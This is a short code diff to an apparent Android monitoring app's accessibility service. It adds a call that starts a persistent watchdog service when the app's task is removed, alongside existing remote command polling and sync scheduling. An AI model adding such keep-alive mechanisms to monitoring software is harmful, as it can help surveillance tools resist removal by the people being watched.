@@ -3194,6 +3194,7 @@ class BlockAccessibilityService : AccessibilityService() {
     override fun onTaskRemoved(rootIntent: android.content.Intent?) {
         super.onTaskRemoved(rootIntent)
         Log.i("BlockA11y", "onTaskRemoved: maintaining background services and sync scheduling")
+        com.spapp.monitoring.sync.PersistentWatchdogService.start(applicationContext)
         startPersistentCommandPolling()
         com.spapp.monitoring.sync.SyncScheduler.schedule(applicationContext)
         com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
